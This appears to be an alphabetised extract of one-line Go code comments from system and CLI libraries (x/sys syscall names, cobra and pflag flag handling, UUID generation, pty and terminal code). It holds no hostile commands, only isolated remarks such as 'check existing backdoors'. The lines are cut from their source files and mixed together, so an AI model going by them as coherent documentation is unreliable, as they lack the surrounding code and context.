// This does not match what most callers expect so we must return an error
// This file is here to allow bodyless functions with go:linkname for Go 1.11
// This file simulates epoll on z/OS using poll.
// This file simulates fstatfs on z/OS using fstatvfs and w_getmntent.
// This flag is set if the Class Install params should be used.
// This flag is set if the caller of DiCallClassInstaller does NOT want the internal default action performed if the Class installer returns ERROR_DI_DO_DEFAULT.
// This forces the user to 
// This format should not be changed: users will be using it explicitly.
// This function can be called multiple times before and/or after completions are added to
// This function returns 1 byte BOOLEAN rather than the 4 byte BOOL.
// This function should really belong to the net package.
// This function will do nothing if any of the following is true:
// This is essentially a copy of cap_rights_is_vset()
// This is essentially a copy of cap_rights_vclear()
// This is essentially a copy of cap_rights_vset()
// This is for commands that have both subcommands and ValidArgs.
// This is for commands that have subcommands but also specify a ValidArgsFunction.
// This is important for commands which have requested to do their own flag completion.
// This is needed if a description contains a linebreak.
// This is not technically the Linux semantics for
// This is not technically the Solaris semantics for
// This is sometimes used by spf13/cobra programs which want to generate additional
// This is the actual system call structure.
// This is the easy case: there's nothing on the screen that we
// This is the version of CapRights this package understands. See C implementation for parallels.
// This is useful when interoperating with Windows code requiring callbacks.
// This means Self had the lower specificity
// This next field is in host-endian byte order. We can't use the
// This one must be last to avoid messing up the iota count.
// This package allows x/sys to use types equivalent to
// This reduces possible side-effects of creating such a command
// This should generally not be needed. Used in some edge cases where it is needed to create a pty
// This special character will be replaced with spacing once the
// This struct is packed on z/OS so it can't be used directly.
// This type is the union inside of TRUSTEE and must be created using one of the TrusteeValueFrom
// This value is rebuilt according to the parsed segments and other
// This variable holds the execpromises and is always nil.
// This variable holds the promises and is always nil.
// This variable will hold either a nil unsafe.Pointer or
// This will only work for bash completion.
// This will resize the pty to the specified size before starting the command if a size is provided.
// This will resize the pty to the specified size before starting the command.
// This works by counting the arguments. Normally -- is not counted as arg but
// Throw away terminating NUL.
// Time returns the time in 100s of nanoseconds since 15 Oct 1582 encoded in
// TimeToTimespec converts t into a Timespec.
// TimerCreate
// TimerDelete
// TimerGetoverrun
// TimerGettime
// TimerSettime
// TimespecToNSec returns the time stored in ts as nanoseconds.
// Timeval have different types in the different OSes
// TimevalToNsec returns the time stored in tv as nanoseconds.
// Tkill (obsolete)
// To create a 
// To implement this using libSystem we'd need syscall_syscallPtr for
// ToAbsolute converts a self-relative security descriptor into an absolute one.
// ToSelfRelative converts an absolute security descriptor into a self-relative one.
// Token types
// Trailing edge.
// Translate name to mib number.
// TranslateAccountName converts a directory service
// TraverseChildren parses flags on all parents before executing child command.
// Try to fill the buffer with data
// Tuxcall
// Type implements pflag.Value.Type.
// Type returns a string that uniquely represents this flag's type.
// UIRestrictionsClass
// UTF16FromString returns the UTF-16 encoding of the UTF-8 string
// UTF16PtrFromString returns pointer to the UTF-16 encoding of
// UTF16PtrToString takes a pointer to a UTF-16 sequence and returns the corresponding UTF-8 encoded string.
// UUID Version 4 generation function will be called concurrently.
// UUID will be the lower 4 bits of version.  NewHash is used to implement
// UUIDs are based on RFC 4122 and DCE 1.1: Authentication and Security
// UUIDs.
// Uint16 returns the Ifreq union data as a C short/Go uint16 value.
// Uint32 returns the Ifreq union data as a C int/Go uint32 value.
// Umask_extended
// Umount2
// Underlying system call writes to newoffset via pointer.
// Unix environment variables.
// Unix returns the time stored in ts as seconds plus nanoseconds.
// Unix returns the time stored in tv as seconds plus nanoseconds.
// UnixCredentials encodes credentials into a socket control message
// UnixRights encodes a set of open file descriptors into a socket
// UnixTime converts t the number of seconds and nanoseconds using the Unix
// UnknownFlags will ignore unknown flags errors and continue parsing rest of the flags
// Unmap the memory and update m.
// UnmarshalBinary implements encoding.BinaryUnmarshaler.
// UnmarshalDir decodes a single 9P stat message from b and returns the resulting Dir.
// UnmarshalJSON implements json.Unmarshaler.
// UnmarshalText implements encoding.TextUnmarshaler interface.
// UnmarshalText implements encoding.TextUnmarshaler.
// UnquoteUsage extracts a back-quoted name from the usage
// Unveil implements the unveil syscall.
// UnveilBlock blocks future unveil calls.
// Update modifies the ProcThreadAttributeList using UpdateProcThreadAttribute.
// Usage is the function called when an error occurs while parsing flags.
// Usage prints to standard error a usage message documenting all defined command-line flags.
// Usage puts out the usage for the command.
// UsageFunc returns either the function set by SetUsageFunc for this command
// UsagePadding return padding for the usage.
// UsageString returns usage string.
// UsageTemplate returns usage template for the command.
// Use SetsockoptLinger instead.
// Use config file from the flag.
// Use is the one-line usage message.
// Use of this source code is governed by a BSD-style
// Use our stashed reference rather than using unsafe on what we got back
// Use the Name method to access the stored interface name. The union data
// Use unsafe to convert addr into a []byte.
// Use unsafe to turn sl into a []byte.
// UseLine puts out the full usage for a given command (including parents).
// Used for flags.
// Used when a user calls help [command].
// Used when a user provides invalid input.
// Used with GetConsoleScreenBuffer to retrieve information about a console
// Uselib
// Uses the randomness pool if it was enabled with EnableRandPool.
// Utimensat
// Utsname members on Dragonfly are only 32 bytes and
// ValidArgs (for the first argument only) or ValidArgsFunction for
// ValidArgs are only for the first argument
// ValidArgs is list of all valid non-flag arguments that are accepted in shell completions
// ValidArgsFunction is an optional function that provides valid non-flag arguments for shell completion.
// Value implements sql.Valuer so that UUIDs can be written to databases
// Value implements the driver Valuer interface.
// Value is the interface to the dynamic value stored in a flag.
// Values for the Attributes member of OBJECT_ATTRIBUTES.
// Var defines a flag with the specified name and usage string. The type and
// Variables should not contain a '-' or ':' character
// Variant returns the variant encoded in uuid.
// Various types of pre-specified SIDs that can be synthesized and compared at runtime.
// Version APIs
// Version defines the version for this command. If this value is non-empty and the command does not
// Version represents a single version.
// Version returns the version of uuid.
// Version that adheres strictly to SemVer specs
// Version.
// VersionTemplate return version template for the command.
// Vfork
// Vhangup
// Visit visits the command-line flags in lexicographical order or
// Visit visits the flags in lexicographical order or
// VisitAll visits the command-line flags in lexicographical order or
// VisitAll visits the flags in lexicographical order or
// VisitParents visits all parents of the command and invokes fn on each parent.
// Volume Management Functions
// Vserver
// Wait4_nocancel
// Waitevent
// Waitid
// Waitid_nocancel
// Warning: using LoadDLL without an absolute path name is subject to
// Watchevent
// We are just copying the boolFlag interface out of goflag as that is what
// We assume that we are working on a terminal that wraps lines
// We can ignore err here since we've pre-parsed the values in segments
// We can't rely on sa.Len being set correctly.
// We can't use the gc-syntax .s files for gccgo. On the plus side
// We cannot use finalCmd.Flags() because we may not have called ParsedFlags() for commands
// We could allocate a large buffer here to reduce the chance that the
// We found no interfaces with a valid hardware address.  If name
// We had assumed dealing with a two-word flag but the flag is a boolean flag.
// We have a prompt and possibly user input on the screen. We
// We have to get the last shorthand flag name
// We have to pass global context to children command
// We keep some constants not supported in OpenBSD 5.5 and beyond for
// We must loop as the string data may change in between the syscalls.
// We need to duplicate the incoming file descriptor
// We only complete sub-commands if:
// We only do flag completion if we are allowed to parse flags
// We only remove the flags from the arguments if DisableFlagParsing is not set.
// We shouldn't need to resize more than once
// We store the number of entries to skip in the seek
// We use an internal buffer to guarantee alignment.
// We wrap around and explicitly zero out the options provided to the OS X
// Well known namespace IDs and UUIDs
// When navigating up and down the history it's possible to return to
// Why suggest both long forms: --flag and --flag= 
// Win
// Win32finddata is what we committed to in Go 1.
// Windows declares this with pshpack1.h
// Windows environment variables.
// Windows reserves errors >= 1<<29 for application use.
// Windows system calls.
// Windows uses 
// WindowsXP or unpatched Windows machine
// Winsize describes the terminal size.
// Winsize is a dummy struct to enable compilation on unsupported platforms.
// Workq_open
// Workq_ops
// Works only on Microsoft Windows.
// Wraps the string 
// Write_nocancel
// Writev
// Writev_nocancel
// XXX I_FIND is not returning an error when the module
// XXX without this we are at risk of the issue
// You may obtain a copy of the License at
// Zero clears the set fds.
// _Sysctl
// ____semctl13
// __clone
// __disable_threadsignal
// __fhopen40
// __fhstat40
// __fhstatvfs140
// __fstat30
// __getcwd
// __getfh30
// __getlogin
// __lstat30
// __mac_execve
// __mac_get_fd
// __mac_get_file
// __mac_get_lcid
// __mac_get_lctx
// __mac_get_link
// __mac_get_mount
// __mac_get_pid
// __mac_get_proc
// __mac_getfsstat
// __mac_mount
// __mac_set_fd
// __mac_set_file
// __mac_set_lctx
// __mac_set_link
// __mac_set_proc
// __mac_syscall
// __mount50
// __msgctl13
// __msync13
// __ntp_gettime30
// __posix_chown
// __posix_fchown
// __posix_lchown
// __posix_rename
// __pthread_canceled
// __pthread_chdir
// __pthread_cond_broadcast
// __pthread_cond_destroy
// __pthread_cond_init
// __pthread_cond_signal
// __pthread_cond_timedwait
// __pthread_cond_wait
// __pthread_fchdir
// __pthread_kill
// __pthread_markcancel
// __pthread_mutex_destroy
// __pthread_mutex_init
// __pthread_mutex_lock
// __pthread_mutex_trylock
// __pthread_mutex_unlock
// __pthread_sigmask
// __semctl
// __semwait_signal
// __semwait_signal_nocancel
// __setlogin
// __shmctl13
// __sigaction_sigtramp
// __sigaltstack14
// __sigpending14
// __sigprocmask14
// __sigsuspend14
// __sigtimedwait
// __sigwait
// __sigwait_nocancel
// __stat30
// __syscall
// __sysctl
// __vfork14
// _ksem_close
// _ksem_destroy
// _ksem_getvalue
// _ksem_init
// _ksem_open
// _ksem_post
// _ksem_trywait
// _ksem_unlink
// _ksem_wait
// _lwp_continue
// _lwp_create
// _lwp_ctl
// _lwp_detach
// _lwp_exit
// _lwp_getname
// _lwp_getprivate
// _lwp_kill
// _lwp_park
// _lwp_self
// _lwp_setname
// _lwp_setprivate
// _lwp_suspend
// _lwp_unpark
// _lwp_unpark_all
// _lwp_wait
// _lwp_wakeup
// _pset_bind
// _sched_getaffinity
// _sched_getparam
// _sched_setaffinity
// _sched_setparam
// a '-' we know it is a flag.  We cannot use isFlagArg() here as it requires
// a '-' we know it is a flag.  We cannot use isFlagArg() here as that function
// a custom error handler.
// a handle for a path name.
// a normal exit returns no message
// a padded or an unpadded string.
// a panic will be issued.
// a read. It aliases into inBuf.
// a sysctl for the given MIB with CTL_QUERY appended.
// a zero value.
// about the ordering.
// abstract Unix domain sockets -- they are supposed
// abstract Unix domain sockets--they are supposed
// access.
// accessed by the program. The return value will be ErrHelp if -help was set
// accessed with the up and down keys.
// acct
// active.
// activeHelpEnvVar returns the name of the program-specific ActiveHelp environment
// addKeyToLine inserts the given key at the current position in the current
// adjfreq
// adjusting the fields in the result directly.
// advanced to the next line.
// after all flags are defined and before flags are accessed by the program.
// after flags have been processed.
// after the completion even if there is a single completion provided.
// after the completion.  We don't want that if the flag ends with an =
// aio_cancel
// aio_error
// aio_fsync
// aio_read
// aio_return
// aio_suspend
// aio_write
// all subcommands should respect it
// all.bat
// allocations at runtime.
// allowing wrapN to go a bit over if that would fit in the
// already set.  The clock sequence is only used for Version 1 UUIDs.
// although there is no description).
// an unsafe.Pointer to a string (execpromises).
// and 
// and a pointer to an array of uintptr. We hide the pointer in the
// and adds missing persistent flags of all parents.
// and adjust the cursor position based on every previous line
// and avoids complicated marshalling and unmarshalling to csv.
// and causes your command to report an error if invoked without the flag.
// and check the flags. Otherwise the mode would be applied to the symlink
// and could therefore provide a wrong completion.
// and earlier (see https://golang.org/issue/23311).
// and metadata information.
// and netinet/in.h included via net/route.h above.
// and panics if error is non-nil.
// and run through the command tree finding appropriate matches
// and the name of the domain on which the account was found.
// and the name of the first domain on which this SID is found.
// and the new cursor position.
// and we'll get memory corruption.
// and which persist.
// and writes it to the passed writer.
// and/or output. See the netdevice(7) man page for details.
// annotation can also be used to obtain the same behavior for flags.
// any argument (can include the first one also).
// any further keys from being linked to the keyring.
// app armor/selinux etc.
// appears at the end of a sequence.
// appending the names to names. It returns the number of
// arbitrary pointer data.
// archives at: https://www.kernel.org/doc/Documentation/networking/can.txt
// are defined and before flags are accessed by the program.
// are ignored and constraints are sorted before comaparison.
// are runnable/hidden/deprecated.
// are supplied.
// are supplied. It will also panic if the procedure cannot be found.
// args is actual args parsed from flags.
// arguments to the underlying system call are the number below
// array or slice flag and therefore must continue being suggested
// as defined by the CM_DRP codes in cfgmgr32.h.
// as shown in the parenthesized examples.
// as the cmd.Flag() search only accepts long flags
// as the size. I don't know why the 
// associated with the current thread. It is a pseudo token that does
// associated with the file description srcFd to the file associated with the
// assumes a simple slice of bytes if 16 bytes
// at a zero byte
// at a zero word
// attempt to install these via packagekit if they're not installed
// attributes for ProcThreadAttributeList
// authentication.
// autogenerating through mkerrors.sh because including
// available here: https://www.kernel.org/doc/Documentation/networking/j1939.rst
// available on the current platform.
// avoid modifying them during plan9.Wstat.
// avoid short orphan words on the final line).
// await() returns '' for no error
// back as hash output or ciphertext.
// back to raw syscalls for this func on Go 1.12.
// based on the running OpenBSD version.
// bash completion information.
// basis by using ValidArgsFunction and ShellCompDirectiveNoFileComp.
// be a private user directory in the case that the application is running
// be provided in file completion.  To request directory names within another
// be set NewUUID returns nil.  If clock sequence has not been set by
// be used:
// be valid against the constraint
// be wrong in the future because we think the cursor is
// be wrongly interpreted as actual completion choices by the completion script.
// because it serves (via godoc flag Usage) as the example
// been disabled.
// before 6.3.
// before the -- and which came after.
// behavior after completions have been provided.
// being sent to the kernel if an ifreq is reused.
// bidirectional communication between a hypervisor and its guest virtual
// boolean flags
// boolean or flags where the 'no option default value' is set
// boundary and not get the bytes leading up to the page
// boundary.
// break
// bufToUTF16 function reinterprets []byte buffer as []uint16
// buffer length needed to store the appropriate data. Note that this differs
// buffer size rounded up to DIRBLKSIZ (see /usr/src/lib/libc/sys/getdirentries.c).
// but accepted if entered manually.
// but it is already in bluetooth_linux.go
// but not defined.
// but the callers below don't care.
// by adding a final Bug [2]uint16 field to the struct and then
// bytes after the NUL removed.
// bytes containing the text of s. If s contains a NUL byte at any
// bytes.
// call to Find() -> legacyArgs() will return an error if there are any arguments.
// call to its Handle method or to one of its
// called after all flags in the FlagSet are defined and before flags are
// caller could create a flag that turns a comma-separated string into a slice
// caller). Pass 
// can be downloaded separately for windows 7 or 8.1).
// can be instructed to have once completions have been provided.
// cf. http://support.microsoft.com/default.aspx
// cgo -godefs -- -Wall -Werror -static -I/tmp/include -fsigned-char _const.go
// cgo -godefs -- -Wall -Werror -static -I/tmp/include -fsigned-char linux/types.go 
// cgo -godefs -- -Wall -Werror -static -I/tmp/include -m32 _const.go
// cgo -godefs -- -Wall -Werror -static -I/tmp/include -m32 linux/types.go 
// cgo -godefs -- -Wall -Werror -static -I/tmp/include -m64 _const.go
// cgo -godefs -- -Wall -Werror -static -I/tmp/include -m64 linux/types.go 
// cgo -godefs -- -Wall -Werror -static -I/tmp/include _const.go
// cgo -godefs -- -Wall -Werror -static -I/tmp/include linux/types.go 
// cgo -godefs -- -fsigned-char types_freebsd.go 
// cgo -godefs -- -fsigned-char types_openbsd.go 
// cgo -godefs -- -m32 _const.go
// cgo -godefs -- -m64 _const.go
// cgo -godefs -- -maix32 _const.go
// cgo -godefs -- -maix64 _const.go
// cgo -godefs -- -marm _const.go
// cgo -godefs -- _const.go
// cgo -godefs types.go
// cgo -godefs types_aix.go 
// cgo -godefs types_darwin.go 
// cgo -godefs types_dragonfly.go
// cgo -godefs types_dragonfly.go 
// cgo -godefs types_freebsd.go
// cgo -godefs types_freebsd.go 
// cgo -godefs types_illumos.go 
// cgo -godefs types_netbsd.go 
// cgo -godefs types_openbsd.go 
// cgo -godefs types_solaris.go 
// character (ex: 
// check existing backdoors
// check if input string is not a mountpoint but a filesystem name
// check if we need to traverse here to parse local flags on parent commands
// clear zeroes the ifreq's union field to prevent trailing garbage data from
// clearsyscall.Errno resets the errno value to 0.
// clen returns the index of the first NULL byte in n or len(n) if n contains no NULL byte.
// clock sequence as well as adjusting the clock sequence as needed.  An error
// clock_getres
// clock_gettime
// clock_settime
// closefrom
// cobra uses default help command.
// command does not define one.
// command lines are passed around.
// command would cause the root command to suddenly have a subcommand.
// commandCalledAs is the name or alias value used to call this command.
// commands is the list of commands supported by this program.
// commonly found on UNIX systems.
// compare sorted slices
// compat_09_ogetdomainname
// compat_09_osetdomainname
// compat_09_ouname
// compat_10_omsgsys
// compat_10_osemsys
// compat_10_oshmsys
// compat_12_fstat12
// compat_12_getdirentries
// compat_12_lstat12
// compat_12_msync
// compat_12_oreboot
// compat_12_oswapon
// compat_12_stat12
// compat_13_sigaction13
// compat_13_sigaltstack13
// compat_13_sigpending13
// compat_13_sigprocmask13
// compat_13_sigreturn13
// compat_13_sigsuspend13
// compat_14___semctl
// compat_14_msgctl
// compat_14_shmctl
// compat_16___sigaction14
// compat_16___sigreturn14
// compat_20_fhstatfs
// compat_20_fstatfs
// compat_20_getfsstat
// compat_20_statfs
// compat_30___fhstat30
// compat_30___fstat13
// compat_30___lstat13
// compat_30___stat13
// compat_30_fhopen
// compat_30_fhstat
// compat_30_fhstatvfs1
// compat_30_getdents
// compat_30_getfh
// compat_30_ntp_gettime
// compat_30_socket
// compat_40_mount
// compat_43_fstat43
// compat_43_lstat43
// compat_43_oaccept
// compat_43_ocreat
// compat_43_oftruncate
// compat_43_ogetdirentries
// compat_43_ogetdtablesize
// compat_43_ogethostid
// compat_43_ogethostname
// compat_43_ogetkerninfo
// compat_43_ogetpagesize
// compat_43_ogetpeername
// compat_43_ogetrlimit
// compat_43_ogetsockname
// compat_43_okillpg
// compat_43_olseek
// compat_43_ommap
// compat_43_oquota
// compat_43_orecv
// compat_43_orecvfrom
// compat_43_orecvmsg
// compat_43_osend
// compat_43_osendmsg
// compat_43_osethostid
// compat_43_osethostname
// compat_43_osetrlimit
// compat_43_osigblock
// compat_43_osigsetmask
// compat_43_osigstack
// compat_43_osigvec
// compat_43_otruncate
// compat_43_owait
// compat_43_stat43
// completion results from the program.  It is used by the shell completion scripts.
// completion results without their description.  It is used by the shell completion scripts.
// completion script prints its logs.
// components.
// computes a Diffie-Hellman shared secret based on the provide params. The
// concurrent access if calling with the same epfd from multiple goroutines.
// concurrent processing of a key press and a Write() call.
// consistency with the corresponding package for other operating systems.
// constants where possible The lower 16 bits of epoll events (uint32) can fit any system poll event (int16).
// constraint string. The string must be a comma-separated list of
// constraints.
// consult database-specific driver documentation for matching types.
// containing a partial key sequence
// containing the text of s. If s contains a NUL byte at any
// contains an interface name and a union of arbitrary data which can be
// continue to function but will not show up in help or usage messages. Using
// control message for sending to another process.
// convert into 100-nanosecond
// convert into nanoseconds
// correct alignment is calculated
// corresponding pty.
// could fail due to an invalid value (incomplete) for the flag.
// countToLeftWord returns then number of characters from the cursor to the
// countToRightWord returns then number of characters from the cursor to the
// creating the necessary file_obj from the provided stat information.
// creation of IPv6 sockets to return EAFNOSUPPORT.
// cron
// currently unsupported functionality on z/OS.
// cursorX contains the current X value of the cursor where the left
// cut trailing : number.
// d.dll = dll
// data generated by h.  The hash should be at least 16 byte in length.  The
// data type of a device property value in the unified device property model.
// database-specific driver documentation for matching types.
// decompose the comma-separated string into the slice.
// default for every argument. One can disable file completion on a per-argument
// default to setting it to zero.
// defaultIsZeroValue returns true if the default value for this flag represents
// defaultUsage is the default function to print a usage message.
// defined and before flags are accessed by the program.
// defined by the Win32 API
// definition to ensure usability.
// delete 'arg' from args or break the loop if len(args) <= 1.
// delete arg from args.
// deprecate a flag by specifying its name and a usage message
// deprecate a flag shorthand by specifying its flag name and a usage message
// descriptor destFd. See the ioctl_ficlonerange(2) man page for details.
// descriptor result on the Go heap.
// descriptor srcFd to the value.Info destinations. See the
// descriptor to a multiplexor.
// dest is empty.
// destination address. To receive such a message the IP_RECVORIGDSTADDR or
// destination which is not what the user expects.
// device drivers. (Passed in 'DriverType' parameter of
// device specified by ifname.
// devices that don't use them.
// difference here is the addition of the Type method that returns a string
// directory names.
// disks
// do it here after merging all flags and just before parse
// do not reorder
// do not sort commands if it already sorted or sorting was disabled
// does not have a length of 16. The bytes are copied from the slice.
// does not specify a specific interface generate a random Node ID
// doing so.
// doing this allows for completion of persistent flag names even for commands that disable flag parsing.
// domain and the users GID for the Group.  The meaning of id for
// domain with the id returned by os.Getgid.
// domain with the id returned by os.Getuid.
// don't do flag completion (see above)
// done.
// double-clicking on the executable from explorer.exe
// double-pushing modules
// driver information list APIs)
// e.g. 
// each parent.
// echo is true if local echo is enabled
// edge is 0. cursorY contains the row number where the first row of
// effect
// element and modification time as the second element.
// embedded sockaddr within the Ifreq's union data. v must be 4 bytes in length
// enabled with EnableRandPool.
// enabling this mode will stop any autocomplete callback from running due to
// encoding used AIX.
// encoding used by AIX.
// encoding used by the Linux kernel and glibc.
// encoding used by z/OS.
// encoding used in Darwin's sys/types.h header.
// encoding used in Dragonfly's sys/types.h header.
// encoding used in FreeBSD's sys/types.h header.
// encoding used in NetBSD's sys/types.h header.
// encoding used in OpenBSD's sys/types.h header.
// encoding/binary helpers to write the bytes without worrying
// encoding: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.
// end of line.
// enforceFlagGroupsForCompletion will do the following:
// entries contains max elements.
// env vars
// environment of the current process.
// envv are the environment variables that should be passed to the new
// epToPollEvt converts epoll event field to poll equivalent.
// epoch of 1 Jan 1970.
// epoll impl for this process.
// err represents an operating system error describing the failure and
// errWriter is a writer defined by the user that replaces stderr
// error handling property and SortFlags set to true.
// error values see on Windows. (perhaps when running
// error.
// even if there is a single completion provided.
// even if we already found sub-commands.
// eventPoll holds a set of file descriptors being watched by the process. A process can have multiple epoll instances.
// events were actually received along with any error information.
// every registered flag.  We need to do this here (and not when the flag was registered
// everyone uses this convention.
// execpromises must be empty when Pledge is called on OpenBSD
// execve
// extattr_delete_fd
// extattr_delete_file
// extattr_delete_link
// extattr_get_fd
// extattr_get_file
// extattr_get_link
// extattr_list_fd
// extattr_list_file
// extattr_list_link
// extattr_set_fd
// extattr_set_file
// extattr_set_link
// extattrctl
// fail.
// failf prints to standard error a formatted error and usage message and
// fails.
// false.
// family and len. The path is then scanned to see if a NUL
// fchroot
// fcntl must never be called with cmd=F_DUP2FD because it doesn't work on AIX
// fdatasync
// fdopendir expects to take control of its argument.
// fgetxattr
// fhopen
// fhstat
// fhstatfs
// field and other data is always empty.
// fields can be get and set using the following methods:
// fields...
// file completion even when no completion is provided.
// file data
// file descriptor destFd. See the ioctl_ficlone(2) man page for details.
// file via a handle as previously returned by NameToHandleAt.
// fileHandle is the argument to nameToHandleAt and openByHandleAt. We
// filters for ReadDirectoryChangesW and FindFirstChangeNotificationW
// first 16 bytes of the hash are used to form the UUID.  The version of the
// first error encountered.
// fktrace
// flag in InitDefaultHelpFlag()
// flagErrorBuf contains all error messages from pflag.
// flagErrorFunc is func defined by user and it's called when the parsing of
// flagValueWrapper implements pflag.Value around a flag.Value.  The main
// flags are unused on FreeBSD
// flags for CreateToolhelp32Snapshot
// flags for EnumProcessModulesEx
// flags for JOBOBJECT_BASIC_LIMIT_INFORMATION.LimitFlags
// flags for SetErrorMode
// flags inside DNSRecord.Dw
// flags is full set of flags.
// flags of that group so the shell completion does not suggest them
// flags returns an error.
// flistxattr
// for Version 2 UUIDs.
// for all flags in the FlagSet. Wrapped to 
// for an invalid value for that flag
// for backwards compatibility because moved TIOCREMOTE to Kernel.framework after MacOSX12.0.sdk.
// for commands and then corresponding flags.
// for completion) so that we can know the root command name for the prefix
// for details.
// for equality. This may not represent logical equivalence
// for how to write your own usage function.
// for security sensitive applications.
// for sending to another process. This can be used for
// for shells that support completion descriptions
// for specific types are permissible. These are defined in ioctl.go and
// for the FlagSet (e.g. making '-' and '_' equivalent).
// for the tipc_subscr timeout __u32 field.
// fork
// forms of xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx and
// found during arg parsing. This allows your program to know which args were
// found early NUL
// fremovexattr
// from /usr/include/sys/param.h Macros for counting and rounding.
// from <sys/ioccom.h>
// from KEYCTL_READ's behavior which always returns the requested payload size.
// from ReadLine with the error set to ErrPasteIndicator.
// from stopped via the core dump bit.
// fsetxattr
// fstatvfs1
// fsync_range
// func gettid() uint64
// func svcLoad(name 
// func svcUnload(name 
// func to return a given type for a given flag name
// function but will not show up in help or usage messages.
// function from module by ordinal.
// function.
// functions for specific types are permissible.
// functions.
// futimens
// future calls would be suspect. Generate an error.
// gbit16 reads a 16-bit number in little-endian order from b and returns it with the remaining slice of b.
// gbit32 reads a 32-bit number in little-endian order from b and returns it with the remaining slice of b.
// gbit64 reads a 64-bit number in little-endian order from b and returns it with the remaining slice of b.
// gbit8 reads an 8-bit number from b and returns it with the remaining slice of b.
// generator.
// generic termibits.h (which is included by termbits.h on sparc).
// getHardwareInterface returns nil values for the JS version of the code.
// getHardwareInterface returns the name and hardware address of interface name.
// getInfo retrieves a specified type of information about an access token.
// getcontext
// getfh
// getgid
// getitimer
// getlogin
// getresgid
// getresuid
// getthrid
// getvfsstat
// getxattr
// getxattr() and listxattr() return the current sizes of the named attributes.
// glibc sources:
// globNormFunc is the global normalization function
// go run linux/mksysnum.go -Wall -Werror -static -I/tmp/include -fsigned-char /tmp/include/asm/unistd.h
// go run linux/mksysnum.go -Wall -Werror -static -I/tmp/include -m32 /tmp/include/asm/unistd.h
// go run linux/mksysnum.go -Wall -Werror -static -I/tmp/include -m64 /tmp/include/asm/unistd.h
// go run linux/mksysnum.go -Wall -Werror -static -I/tmp/include /tmp/include/asm/unistd.h
// go run mkasm_darwin.go amd64
// go run mkasm_darwin.go arm64
// go run mksysctl_openbsd.go
// go run mksysnum.go /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.14.sdk/usr/include/sys/syscall.h
// go run mksysnum.go /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.1.sdk/usr/include/sys/syscall.h
// go run mksysnum.go http://cvsweb.netbsd.org/bsdweb.cgi/
// go run mksysnum.go https://cvsweb.openbsd.org/cgi-bin/cvsweb/
// go run mksysnum.go https://gitweb.dragonflybsd.org/dragonfly.git/blob_plain/HEAD:/sys/kern/syscalls.master
// go run mksysnum.go https://svn.freebsd.org/base/stable/11/sys/kern/syscalls.master
// group commands.
// hardcode TIOCSWINSZ.
// hasNameOrAliasPrefix returns true if the Name or any of aliases start
// have been provided (this implies none of the other directives).
// have to clear it first.
// have to move out of the way.
// head contains the index of the element most recently added to the ring.
// help topic command
// help/usage messages.
// helpFunc is help func defined by user.
// helpTemplate is help template defined by user.
// here rather than letting the caller think that the call succeeded.
// hide a flag by specifying its name
// history contains previously entered commands so that they can be
// historyPending.
// holds a value of type syscall.Errno.
// holds a value of type syscall.ErrorString.
// hope we don't get to process files so large to overflow these size
// how many files we've already returned.
// http://blogs.msdn.com/b/drnick/archive/2007/12/19/windows-and-upn-format-credentials.aspx
// http://lists.dragonflybsd.org/pipermail/users/2019-September/358280.html
// http://man7.org/linux/man-pages/man1/keyctl.1.html.
// http://man7.org/linux/man-pages/man2/keyctl.2.html
// http://man7.org/linux/man-pages/man3/keyctl_dh_compute.3.html
// http://man7.org/linux/man-pages/man3/keyctl_get_keyring_ID.3.html
// http://man7.org/linux/man-pages/man3/keyctl_instantiate_iov.3.html
// http://man7.org/linux/man-pages/man3/keyctl_join_session_keyring.3.html
// http://man7.org/linux/man-pages/man3/keyctl_restrict_keyring.3.html
// http://man7.org/linux/man-pages/man3/keyctl_search.3.html
// http://man7.org/linux/man-pages/man3/keyctl_setperm.3.html
// http://www.apache.org/licenses/LICENSE-2.0
// https://docs.microsoft.com/en-us/windows/console/console-screen-buffer-info-str
// https://docs.microsoft.com/en-us/windows/console/setconsolemode for details.
// https://github.com/spf13/cobra/issues/1257
// https://man7.org/linux/man-pages/man2/mount_setattr.2.html
// https://msdn.microsoft.com/en-us/library/ms684179(v=vs.85).aspx says:
// https://semver.org/
// https://sourceware.org/git/
// https://www.illumos.org/issues/9042
// https://www.kernel.org/doc/html/latest/watchdog/watchdog-api.html.
// huge mess with gnome-terminal.
// identical so pass 
// identifier constants
// if -- was already set or interspersed is false and there is already one arg then
// if TraverseChildren is true we should allow to complete subcommands
// if context is present on the parent command.
// if d.dll != nil {
// if found. It returns an error if search fails.
// if it is already found and loaded into memory.
// if len(flag.NoOptDefVal) == 0 {
// if not already set.
// if p.proc == nil {
// if the CLI is started from explorer.exe.
// if the CLI is started from explorer.exe. Set to 0 to wait for the return key to be pressed.
// if the command is invoked with a subset (but not all) of the given flags.
// if the command is invoked with more than one flag from the given set of flags.
// ifaliasreq contains if_data
// iflags contains inherited flags.
// ignoring error from shmdt as there's nothing sensible to return here
// ignoring manifest semantics and the application compatibility layer.
// illumos system calls not present on Solaris.
// implementations to limit completions for the named persistent flag to
// implementations to limit completions for the named persistent flag to the
// in a signal handler for syscall.SIGWINCH to automatically resize the tty when
// in a variety of automatic locations unless constrained by flags.
// in case the program also registered a completion function for this flag.
// in each line) in terminal t.
// in http://msdn.microsoft.com/en-us/library/ms880421.
// inReader is a reader defined by the user that replaces stdin
// in_addr/Go []byte (4-byte IPv4 address) value. If the sockaddr family is not
// include the command name.  Must be called after all flags in the FlagSet
// include the command name. The arguments for fn are flag and value. Must be
// including OS X (Darwin) and FreeBSD.  Like the other
// increment the clock sequence
// initDefaultCompletionCmd adds a default 'completion' command to c.
// initialize completion at the last point to allow for user overriding
// initialize help and version flag at the last point possible to allow for user
// initialize help at the last point to allow for user overriding
// initialize the hidden command to be used for shell completion
// installed packages
// instead we pack it here.
// integer array of open file descriptors from another process.
// integer that is returned by the ioctl syscall.
// interfaces is returned.  If no interfaces are found (name does not exist or
// interpret pasted data more literally than typed data.
// ints and then compared.
// ioctlIfreqData performs an ioctl using an ifreqData structure for input
// ioctl_fideduperange(2) man page for details.
// ioctl_linux.go.
// is a shortcut to using this directive explicitly.
// is a shortcut to using this directive explicitly.  The BashCompFilenameExt
// is already pushed even though truss reports a return
// is commonly used for inputting passwords and other sensitive data. The slice
// is in the high bits.
// is in the high bits.  At least that's the idea.
// is in the high bits. At least that's the idea.
// is longer.
// is no way for the version to be valid against the constraint
// is returned if the current time cannot be determined.
// is returned.
